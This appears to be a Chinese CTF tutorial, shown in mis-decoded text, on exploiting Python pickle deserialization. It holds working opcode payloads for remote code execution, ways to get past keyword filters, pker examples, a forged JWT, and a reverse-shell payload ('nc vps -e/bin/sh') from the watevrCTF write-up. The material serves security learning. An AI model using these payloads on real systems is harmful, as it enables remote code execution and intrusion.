é‚£ä»€ä¹ˆæ˜¯__setstate__å‘¢ï¼Ÿå®˜æ–¹æ–‡æ¡£ä¸­ï¼Œå¦‚æœæƒ³è¦å­˜å‚¨å¯¹è±¡çš„çŠ¶æ€ï¼Œå°±å¯ä»¥ä½¿ç”¨__getstat__å’Œ__setstat__æ–¹æ³•ã€‚ç”±äºpickleåŒæ ·å¯ä»¥å­˜å‚¨å¯¹è±¡å±æ€§çš„çŠ¶æ€ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ä¸»è¦æ˜¯é’ˆå¯¹é‚£äº›ä¸å¯è¢«åºåˆ—åŒ–çš„çŠ¶æ€ï¼Œå¦‚ä¸€ä¸ªè¢«æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„open(file,'r')ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­ import pickle class Person: def __init__(self, name, age=0): self.name = name self.age = age def __str__(self): return f\"name: {self.name} age: {self.age}\" class Child(Person): def __setstate__(self, state): print(\"invoke __setstate__\") self.name=state self.age=10 def __getstate__(self): print(\"invoke __getstate__\") return \"Child\" c1=Child(\"TEST\") print(c1) #name: TEST #age: 0 opcode=pickle.dumps(c1,protocol=0) print(opcode) #invoke __getstate__ #b'ccopy_reg _reconstructor p0 (c__main__ Child p1 c__builtin__ object p2 Ntp3 Rp4 VChild p5 b.' c2=pickle.loads(opcode) print(c2) #invoke __setstate__ #name: Child #age: 10 å½“å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨__getstate__ï¼Œè¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨__setstate__ã€‚é‡å†™æ—¶å¯ä»¥çœç•¥__setstate__ï¼Œä½†__getstate__å¿…é¡»è¿”å›ä¸€ä¸ªå­—å…¸ã€‚å¦‚æœ__getstate__ä¸__setstate__éƒ½è¢«çœç•¥, é‚£ä¹ˆå°±é»˜è®¤è‡ªåŠ¨ä¿å­˜å’ŒåŠ è½½å¯¹è±¡çš„å±æ€§å­—å…¸__dict__ã€‚ åœ¨pickleæºç ä¸­ï¼Œå­—èŠ‚ç bå¯¹åº”çš„æ˜¯load_build()å‡½æ•° def load_build(self): stack = self.stack state = stack.pop() #é¦–å…ˆè·å–æ ˆä¸Šçš„å­—èŠ‚ç bå‰çš„ä¸€ä¸ªå…ƒç´ ï¼Œå¯¹äºå¯¹è±¡æ¥è¯´ï¼Œè¯¥å…ƒç´ ä¸€èˆ¬æ˜¯å­˜å‚¨æœ‰å¯¹è±¡å±æ€§çš„dict inst = stack[-1] #è·å–è¯¥å­—å…¸ä¸­é”®åä¸º\"__setstate__\"çš„value setstate = getattr(inst, \"__setstate__\", None) #å¦‚æœå­˜åœ¨ï¼Œåˆ™æ‰§è¡Œvalue(state) if setstate is not None: setstate(state) return slotstate = None if isinstance(state, tuple) and len(state) == 2: state, slotstate = state #å¦‚æœ\"__setstate__\"ä¸ºç©ºï¼Œåˆ™stateä¸å¯¹è±¡é»˜è®¤çš„__dict__åˆå¹¶ï¼Œè¿™ä¸€æ­¥å…¶å®å°±æ˜¯å°†åºåˆ—åŒ–å‰ä¿å­˜çš„æŒä¹…åŒ–å±æ€§å’Œå¯¹è±¡å±æ€§å­—å…¸åˆå¹¶ if state: inst_dict = inst.__dict__ intern = sys.intern for k, v in state.items(): if type(k) is str: inst_dict[intern(k)] = v else: inst_dict[k] = v #å¦‚æœ__setstate__å’Œ__getstate__éƒ½æ²¡æœ‰è®¾ç½®ï¼Œåˆ™åŠ è½½é»˜è®¤__dict__ if slotstate: for k, v in slotstate.items(): setattr(inst, k, v) dispatch[BUILD[0]] = load_build é‚£ä¹ˆè¿™æœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬å°†å­—å…¸{\"__setstate__\":os.system}ï¼Œå‹å…¥æ ˆä¸­ï¼Œå¹¶æ‰§è¡Œbå­—èŠ‚ç ï¼Œï¼Œç”±äºæ­¤æ—¶å¹¶æ²¡æœ‰__setstate__ï¼Œæ‰€ä»¥è¿™é‡Œbå­—èŠ‚ç ç›¸å½“äºæ‰§è¡Œäº†__dict__.updateï¼Œå‘å¯¹è±¡çš„å±æ€§å­—å…¸ä¸­æ·»åŠ äº†ä¸€å¯¹æ–°çš„é”®å€¼å¯¹ã€‚å¦‚æœæˆ‘ä»¬ç»§ç»­å‘æ ˆä¸­å‹å…¥å‘½ä»¤commandï¼Œå†æ¬¡æ‰§è¡Œbå­—èŠ‚ç æ—¶ï¼Œç”±äºå·²ç»æœ‰äº†__setstate__ï¼Œæ‰€ä»¥ä¼šå°†æ ˆä¸­å­—èŠ‚ç bçš„å‰ä¸€ä¸ªå…ƒç´ å½“ä½œstateï¼Œæ‰§è¡Œ__setstate__(state)ï¼Œä¹Ÿå°±æ˜¯os.system(command)ã€‚ Payloadå¦‚ä¸‹ opcode=b'''(c__main__ Animal S'Casual' I18 o}(S\"__setstate__\" #å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªç©ºå­—å…¸ï¼Œç„¶åå†é€šè¿‡uä¿®æ”¹ä¸º{\"__setstate__\":os.system} cos system ubS\"whoami\" b.''' æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸRCE import pickle import stao import pickletools class Animal: def __init__(self, name, category): self.name = name self.category = category def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category def check(data): if b'R' in data: return 'no reduce!' x=pickle.loads(data) if(x!= Animal(stao.name,stao.age)): print('not equal') return print('well done! {} {}'.format(stao.name,stao.age)) opcode=b'''(c__main__ Animal S'Casual' I18 o}(S\"__setstate__\" cos system ubS\"whoami\" b.''' check(opcode) pickletools.dis(opcode) ### xiaoh\\34946 not equal 0: ( MARK 1: c GLOBAL '__main__ Animal' 18: S STRING 'Casual' 28: I INT 18 32: o OBJ (MARK at 0) 33: } EMPTY_DICT 34: ( MARK 35: S STRING '__setstate__' 51: c GLOBAL 'os system' 62: u SETITEMS (MARK at 34) 63: b BUILD 64: S STRING 'whoami' 74: b BUILD 75: . STOP highest protocol among opcodes = 1 7.3 ç»•è¿‡å…³é”®å­—è¿‡æ»¤ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå‡å¦‚æˆ‘ä»¬æƒ³åˆ©ç”¨opcodeè¿›è¡Œå˜é‡è¦†ç›–ä»è€Œè¿›è¡Œèº«ä»½ä¼ªé€ ï¼Œä½†æ˜¯ä»£ç ä¸­è¿‡æ»¤äº†æˆ‘ä»¬æƒ³è¦è¦†ç›–çš„å±æ€§å…³é”®å­—ã€‚æ¯”å¦‚[2022å¼ºç½‘æ¯ crash]ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ class User: def __init__(self, username,password): self.username=username self.token=hash(password) @app.route('/balancer', methods=['GET', 'POST']) def flag(): pickle_data=base64.b64decode(request.cookies.get(\"userdata\")) if b'R' in pickle_data or b\"secret\" in pickle_data: return \"You damm hacker!\" os.system(\"rm -rf *py*\") userdata=pickle.loads(pickle_data) if userdata.token!=hash(get_password(userdata.username)): return \"Login First\" if userdata.username=='admin': return \"Welcome admin, here is your next challenge!\" return \"You're not admin!\" æºç å¼•å…¥adminæ¨¡å—ï¼Œå…¶ä¸­å­˜æ”¾äº†å±æ€§secretã€‚ç°åœ¨é¢˜ç›®è¿‡æ»¤äº†å±æ€§åï¼Œç°åœ¨å¦‚ä½•è¿›è¡Œç»•è¿‡å‘¢ï¼Ÿä¸‹é¢ç»™å‡ºä¸‰ç§æ€è·¯ åˆ©ç”¨VæŒ‡ä»¤è¿›è¡ŒUnicodeç»•è¿‡ V`æŒ‡ä»¤çš„ç”¨æ³•å¦‚ä¸‹ï¼Œç±»ä¼¼äºæŒ‡ä»¤`S æ­£å¸¸æˆ‘ä»¬å¯ä»¥æ„é€ å˜é‡è¦†ç›–å¦‚ä¸‹æ¥ç»•è¿‡æ¯”è¾ƒ b'''capp admin (S'secret' I1 db0(capp User S\"admin\" I1 o.''' è¿‡æ»¤äº†secretä¹‹åå¯ä»¥æ„é€ å¦‚ä¸‹ b'''capp admin (Vsecr\\u0065t I1 db0(capp User S\"admin\" I1 o.''' åå…­è¿›åˆ¶ç»•è¿‡ æ“ä½œç Sä¹Ÿèƒ½å¤Ÿè¯†åˆ«åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ b'''capp admin (S'\\x73ecret' I1 db0(capp User S\"admin\" I1 o.''' åˆ©ç”¨å†…ç½®å‡½æ•°è·å–å…³é”®å­— å¯¹äºå·²å¯¼å…¥çš„æ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡sys.modules['xxx']æ¥è·å–è¯¥æ¨¡å—ï¼Œç„¶åé€šè¿‡å†…ç½®å‡½æ•°dir()æ¥åˆ—å‡ºæ¨¡å—ä¸­çš„æ‰€æœ‰å±æ€§ print(dir(sys.modules['admin'])) #['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'secret'] å¯ä»¥çœ‹åˆ°æ¨¡å—ä¸­çš„å±æ€§æ˜¯ä»¥åˆ—è¡¨çš„å½¢å¼è¾“å‡ºï¼Œä¸”æˆ‘ä»¬æ‰€éœ€çš„å­—ç¬¦ä¸²ä½äºåˆ—è¡¨æœ«å°¾ã€‚ ç”±äºpickleä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥è·å–æ‰€éœ€çš„å­—ç¬¦ä¸²ã€‚åœ¨Pythonä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡reversed()å‡½æ•°æ¥å°†åˆ—è¡¨é€†åºï¼Œå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å¯¹è±¡ ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡next()å‡½æ•°æ¥è·å–è¿­ä»£å¯¹è±¡çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œé»˜è®¤ä»ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ã€‚æœ€ç»ˆå¯ä»¥æ„é€ å¦‚ä¸‹ print(next(reversed(dir(sys.modules['admin'])))) #secret è¿™ç±»ä¼¼PHPçš„æ— å‚æ•°RCE opcodeæ„é€ å¦‚ä¸‹ opcode=b'''(((((c__main__ admin i__builtin__ dir i__builtin__ reversed i__builtin__ next .''' print(pickle.loads(opcode)) #secret è·å–åˆ°äº†secretå­—ç¬¦ä¸²ï¼Œä¸‹é¢å°±å®¹æ˜“æ„é€ å˜é‡è¦†ç›–äº† opcode = b'''c__main__ admin (((((c__main__ admin i__builtin__ dir i__builtin__ reversed i__builtin__ next I1 db(S'admin' I1 i__main__ User .''' 0x08 pkerä½¿ç”¨è¯´æ˜ 8.1 ç®€ä»‹ pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚ ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼ˆç”Ÿæˆpickleç‰ˆæœ¬0çš„opcodeï¼‰ã€‚ å†æ¬¡å»ºè®®ï¼Œåœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚ æ­¤å¤–ï¼Œpkerçš„å®ç°ç”¨åˆ°äº†pythonçš„astï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰åº“ï¼ŒæŠ½è±¡è¯­æ³•æ ‘ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦ä¸œè¥¿ï¼Œæœ‰å…´è¶£çš„å¯ä»¥ç ”ç©¶ä¸€ä¸‹aståº“å’Œpkerçš„æºç ï¼Œç”±äºç¯‡å¹…é™åˆ¶ï¼Œè¿™é‡Œä¸å†å™è¿°ã€‚ 8.2 pkerèƒ½åšçš„äº‹ å¼•ç”¨è‡ªhttps://xz.aliyun.com/t/7012#toc-5ï¼š å˜é‡èµ‹å€¼ï¼šå­˜åˆ°memoä¸­ï¼Œä¿å­˜memoä¸‹æ ‡å’Œå˜é‡åå³å¯ å‡½æ•°è°ƒç”¨ ç±»å‹å­—é¢é‡æ„é€  listå’Œdictæˆå‘˜ä¿®æ”¹ å¯¹è±¡æˆå‘˜å˜é‡ä¿®æ”¹ å…·ä½“æ¥è®²ï¼Œå¯ä»¥ä½¿ç”¨pkerè¿›è¡ŒåŸå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œã€å®ä¾‹åŒ–æ–°çš„å¯¹è±¡ã€‚ 8.3 ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹ pkerä¸­çš„é’ˆå¯¹pickleçš„ç‰¹æ®Šè¯­æ³•éœ€è¦é‡ç‚¹æŒæ¡ï¼ˆåæ–‡ç»™å‡ºç¤ºä¾‹ï¼‰ æ­¤å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼špythonä¸­çš„æ‰€æœ‰ç±»ã€æ¨¡å—ã€åŒ…ã€å±æ€§ç­‰éƒ½æ˜¯å¯¹è±¡ï¼Œè¿™æ ·ä¾¿äºå¯¹å„æ“ä½œè¿›è¡Œç†è§£ã€‚ pkerä¸»è¦ç”¨åˆ°GLOBALã€INSTã€OBJä¸‰ç§ç‰¹æ®Šçš„å‡½æ•°ä»¥åŠä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼Œå…¶ä»–çš„opcodeä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ï¼š ä»¥ä¸‹moduleéƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­module è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´ å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»· GLOBAL å¯¹åº”opcodeï¼šb'c' è·å–moduleä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼š GLOBAL('os', 'system') è¾“å…¥ï¼šmodule,instance(callableã€moduleéƒ½æ˜¯instance) INST å¯¹åº”opcodeï¼šb'i' å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼š INST('os', 'system', 'ls') è¾“å…¥ï¼šmodule,callable,para OBJ å¯¹åº”opcodeï¼šb'o' å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼š OBJ(GLOBAL('os', 'system'), 'ls') è¾“å…¥ï¼šcallable,para xxx(xx,...) å¯¹åº”opcodeï¼šb'R' ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ ˆå¹¶è°ƒç”¨ï¼‰ li[0]=321 æˆ– globals_dic['local_var']='hello' å¯¹åº”opcodeï¼šb's' æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼ xx.attr=123 å¯¹åº”opcodeï¼šb'b' å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½® return å¯¹åº”opcodeï¼šb'0' å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼š return xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰ æ³¨æ„ï¼š ç”±äºopcodeæœ¬èº«çš„åŠŸèƒ½é—®é¢˜ï¼Œpkerè‚¯å®šä¹Ÿä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸ºå·¦å€¼ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚getattrã€dict.getï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨sã€uã€bæ“ä½œç¬¦ï¼Œä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚ pkerè§£æSæ—¶ï¼Œç”¨å•å¼•å·åŒ…è£¹å­—ç¬¦ä¸²ã€‚æ‰€ä»¥pkerä»£ç ä¸­çš„åŒå¼•å·ä¼šè¢«è§£æä¸ºå•å¼•å·opcode: test=\"123\" return test è¢«è§£æä¸ºï¼š b\"S'123' p0 0g0 .\" pkerï¼šå…¨å±€å˜é‡è¦†ç›– è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥çš„secretæ¨¡å—ä¸­çš„nameä¸categoryå˜é‡ï¼š secret=GLOBAL('__main__', 'secret') # pythonçš„æ‰§è¡Œæ–‡ä»¶è¢«è§£æä¸º__main__å¯¹è±¡ï¼Œsecretåœ¨è¯¥å¯¹è±¡ä»å±ä¸‹ secret.name='1' secret.category='2' è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ï¼š game = GLOBAL('guess_game', 'game') game.curr_ticket = '123' æ¥ä¸‹æ¥ä¼šç»™å‡ºä¸€äº›å…·ä½“çš„åŸºæœ¬æ“ä½œçš„å®ä¾‹ã€‚ pkerï¼šå‡½æ•°æ‰§è¡Œ é€šè¿‡b'R'è°ƒç”¨ï¼š s='whoami' system = GLOBAL('os', 'system') system(s) # `b'R'`è°ƒç”¨ return é€šè¿‡b'i'è°ƒç”¨ï¼š INST('os', 'system', 'whoami') é€šè¿‡b'c'ä¸b'o'è°ƒç”¨ï¼š OBJ(GLOBAL('os', 'system'), 'whoami') å¤šå‚æ•°è°ƒç”¨å‡½æ•° INST('[module]', '[callable]'[, par0,par1...]) OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...]) pkerï¼šå®ä¾‹åŒ–å¯¹è±¡ å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œ animal = INST('__main__', 'Animal','1','2') return animal # æˆ–è€… animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2') return animal å…¶ä¸­ï¼ŒpythonåŸæ–‡ä»¶ä¸­åŒ…å«ï¼š class Animal: def __init__(self, name, category): self.name = name self.category = category ä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼š animal = INST('__main__', 'Animal') animal.name='1' animal.category='2' return animal æ‰‹åŠ¨è¾…åŠ© æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„.å»æ‰ï¼Œä¸¤è€…æ‹¼æ¥èµ·æ¥å³å¯ã€‚ å»ºç«‹æ™®é€šçš„ç±»æ—¶ï¼Œå¯ä»¥å…ˆpickle.dumpsï¼Œå†æ‹¼æ¥è‡³payloadã€‚ 8.4 CTFå®æˆ˜ åœ¨å®é™…ä½¿ç”¨pkeræ—¶ï¼Œé¦–å…ˆéœ€è¦æœ‰å¤§æ¦‚çš„æ€è·¯ï¼Œä¿è¯èƒ½åšåˆ°æ‰‹å†™æ¯ä¸€æ­¥çš„opcodeï¼Œç„¶åä½¿ç”¨pkerå¯¹æ€è·¯è¿›è¡Œå®ç°ã€‚ [CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun é¦–å…ˆæ˜¯ä¸€ä¸ªè„šæœ¬çˆ†ç ´ é¦–é¡µå‘Šè¯‰æˆ‘ä»¬è¦å–åˆ°lv6ï¼Œé‚£æˆ‘ä»¬é¦–å…ˆå¾—æ‰¾åˆ°å®ƒï¼Œç”±äºé¡µé¢å¾ˆå¤šï¼Œæ‰‹åŠ¨ä¸ç°å®ï¼Œæ•…æ­¤éœ€è¦è„šæœ¬æ‰¾ import requests import time for i in range(0, 2000): time.sleep(0.5) url = 'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'.format(i) res = requests.get(url) if 'lv6.png' in res.text: print(\"æ‰¾åˆ°lv6----{}\".format(i)) å¦‚ä¸Šå›¾åœ¨181é¡µï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹ï¼Œæˆ‘ä»¬åœ¨ç»“ç®—çš„æ—¶å€™æŠ“åŒ…çœ‹çœ‹ å¦‚ä¸Šå›¾æˆ‘ä»¬ä¿®æ”¹æŠ˜æ‰£è¿›è¡Œè´­ä¹°ï¼Œéšåçœ‹åˆ°å³ä¾§æœ‰ä¸ªé‡å®šå‘ï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹b1g_m4mber çœ‹åˆ°è¿™é‡Œåªå…è®¸adminè®¿é—®ï¼Œåˆçœ‹åˆ°å…¶ä¸­æœ‰jwtï¼Œé‚£æ¯«æ— ç–‘é—®å°±æ˜¯ä¼ªé€ jtwäº†ï¼Œé‚£é¦–å…ˆæˆ‘ä»¬å…ˆè¦æ‹¿åˆ°secretï¼Œè¿™é‡Œä¹Ÿæ˜¯çœ‹wpå‘ç°æ˜¯é€šè¿‡çˆ†ç ´æ‰¾åˆ°secretçš„ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼š githubé“¾æ¥https://github.com/brendan-rius/c-jwt-cracker ç”¨æ³•è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œå¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°secretæ˜¯1Kun å¦‚ä¸Šå›¾è¿›è¡Œä¼ªé€ ä¹‹åå‘é€åˆ°bpï¼š eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA å‘é€ä¹‹åæ˜¯å¦‚ä¸‹é¡µé¢ï¼š æˆåŠŸä»¥adminèº«ä»½ç™»å½•ï¼Œæ¥ä¸‹æ¥çœ‹ä¸€ä¸‹æºä»£ç å‘ç°å­˜åœ¨www.zipæˆ‘ä»¬ä¸‹è½½çœ‹çœ‹ å¦‚æœæˆ‘ä»¬ä¸Šè¿°æˆåŠŸçš„è¯ï¼Œå°±ä¼šå¾—åˆ°æºç ï¼Œæˆ‘ä»¬æ‰¾åˆ°Admin.pyçœ‹åˆ°å¦‚ä¸‹ä»£ç  import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) åˆ†æå¯ä»¥çŸ¥é“ï¼Œåªæœ‰æˆ‘ä»¬ç”¨æˆ·ä¸ºadminï¼Œéšåå‘becomeè¿›è¡Œä¼ å‚ï¼Œå†…å®¹ä¸ºåºåˆ—åŒ–å†…å®¹ä¹‹åç”±äºrenderçš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œpayloadå¦‚ä¸‹ import pickle import urllib class pop(object): def __reduce__(self): return(eval, (\"open('/flag.txt', 'r').read()\", )) poc = pop() s = pickle.dumps(poc) print(urllib.qoute(s))#æ³¨æ„ä¸Šè¿°é¢˜ç›®ä¸­çš„på‚æ•°æ˜¯ç»è¿‡urllib.unquoteå‡½æ•°å¤„ç†çš„ ä¹‹ååœ¨python2ç¯å¢ƒä¸‹è¿è¡Œï¼Œå‘becomeä¼ å‚å³å¯ è¿™é‡Œç‚¹å‡»é¡µé¢çš„ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜ä¹‹åæŠ“åŒ…ï¼Œä¿®æ”¹becomeå‚æ•°ï¼Œæ‹¿åˆ°flag Bandit-è‡ªåŠ¨åŒ–å·¥å…· Bandit æ˜¯ä¸€æ¬¾æ—¨åœ¨æŸ¥æ‰¾ Python ä»£ç ä¸­å¸¸è§å®‰å…¨é—®é¢˜çš„å·¥å…·ã€‚ä¸ºæ­¤ï¼ŒBandit å¤„ç†æ¯ä¸ªæ–‡ä»¶ï¼Œä»ä¸­æ„å»º ASTï¼Œå¹¶é’ˆå¯¹ AST èŠ‚ç‚¹è¿è¡Œé€‚å½“çš„æ’ä»¶ã€‚ä¸€æ—¦ Bandit å®Œæˆæ‰«ææ‰€æœ‰æ–‡ä»¶ï¼Œå®ƒå°±ä¼šç”Ÿæˆä¸€ä»½æŠ¥å‘Šã€‚ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šè¿°å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨çš„ä»£ç å®¡è®¡ï¼Œçœ‹çœ‹ä¸Šè¿°å·¥å…·æ˜¯å¦å¯ä»¥åˆ†æå‡ºæ¥æºç ä¸­å«æœ‰pickleæ¼æ´ bandit -r éœ€è¦åˆ†æçš„æ–‡ä»¶è·¯å¾„ å¦‚ä¸Šå›¾ï¼Œçš„ç¡®è·Ÿæˆ‘ä»¬æ‰‹å·¥åˆ†æçš„æ³¨å…¥ç‚¹ä¸€è‡´ [watevrCTF-2019]Pickle Store åˆšå¼€å§‹æç¤ºæˆ‘ä»¬è¦ä¹°pickleè¿™ä¸ªä¸œè¥¿ï¼Œä½†æˆ‘ç”¨bpæŠ“åŒ…åªæ˜¯å‘ç°äº†cookieä»¥åŠidåœ¨å˜åŒ–ï¼Œçœ‹ç€åƒbase64ï¼Œä½†è§£å¯†å´æ˜¯ä¸€å †ä¹±ç ï¼Œäºæ˜¯çœ‹äº†wpå‘ç°è¿™æ˜¯å…ˆpickleåºåˆ—åŒ–ååœ¨baseè§£å¯†çš„ï¼Œé‚£å°±å¥½åŠäº†ï¼Œå†™ä¸€ä¸ªç®€å•è„šæœ¬å³å¯ import pickle import base64 result = 'gAN9cQAoWAUAAABtb25leXEBS2RYBwAAAGhpc3RvcnlxAl1xAyhYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQVYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQZYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQdlWBAAAABhbnRpX3RhbXBlcl9obWFjcQhYIAAAADU3YzExYTRmMTE4YmM2Yzc5YmFmNjI2NWE5MWI5NWQwcQl1Lg==' result = base64.b64decode(result) result = pickle.loads(result) print(result) è§£å¯†å‡ºæ¥ä¸ºï¼š {'money': 100, 'history': ['Yummy smÃ¶rgÃ¥sgurka', 'Yummy smÃ¶rgÃ¥sgurka', 'Yummy smÃ¶rgÃ¥sgurka', 'Yummy smÃ¶rgÃ¥sgurka'], 'anti_tamper_hmac': '57c11a4f118bc6c79baf6265a91b95d0'} è¿™é‡Œçœ‹åˆ°ä¸ªhmacæœäº†æœæ˜¯ä¸ªç®—æ³•ä»€ä¹ˆçš„ï¼Œä¹Ÿæ²¡å…·ä½“äº†è§£å°±çœ‹wpäº†ï¼Œè¿™é‡Œä»–ä»¬è¯´è¿™ç§ç®—æ³•ä¹Ÿæ²¡æ³•åˆ©ç”¨äº†ï¼Œå¯ä»¥ç›´æ¥å°†ä¸€æ®µæ¶æ„çš„pickleä»£ç base64ç¼–ç åæ”¾åˆ°cookieè¿›è¡Œgetshellã€‚å› ä¸ºè¿™é‡Œæ˜¯buuç¯å¢ƒï¼Œå†…éƒ¨é¶æœºä¸å‡ºç½‘ï¼Œæ‰€ä»¥ä¹Ÿæ‡’å¾—å»å¼€å°å·å•¥çš„ï¼Œå°±çœ‹ä¸ªæ€è·¯ï¼Œpayloadå¦‚ä¸‹ï¼š import pickle class Demo(object): def __reduce__(self): return(eval, (\"__import__('os').system('nc vps -e/bin/sh')\",)) pop = Demo() print(base64.b64encode(pickle.dumps(pop))) #è¾“å‡º b'gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIHZwcyAtZS9iaW4vc2gnKZSFlFKULg==' ä¹‹ååå¼¹æˆåŠŸè¿›è¡Œgetshellå³å¯ å‚è€ƒï¼šhttps://www.cnblogs.com/h3zh1/p/12698897.html 